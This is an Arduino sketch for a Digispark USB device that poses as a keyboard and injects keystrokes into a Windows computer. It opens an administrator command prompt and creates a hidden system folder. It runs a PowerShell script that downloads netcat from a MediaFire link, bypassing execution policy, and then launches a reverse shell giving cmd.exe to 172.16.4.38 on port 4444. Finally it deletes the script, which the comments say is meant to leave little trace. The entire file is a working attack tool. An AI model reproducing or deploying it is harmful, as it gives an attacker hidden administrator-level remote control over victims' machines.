#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //do i need to explain what this does
  DigiKeyboard.delay(400);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); //opens cmd as administrator
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cd / & mkdir win & attrib +s +h win & cd /win & echo (wget 'http://download1640.mediafire.com/cynhfn6wc84g/kjflwyvxh42vk0g/nc64.exe' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1"); //does all the hacky stuff
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2900);
  DigiKeyboard.print("START /min a.exe 172.16.4.38 4444 -e cmd.exe -d & del b.ps1 & exit"); //even more hacky stuff also dels b.ps1 to leave as little of a trace as possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH); //turns on led when script has finished
  for(;;){ /*empty*/ }
}
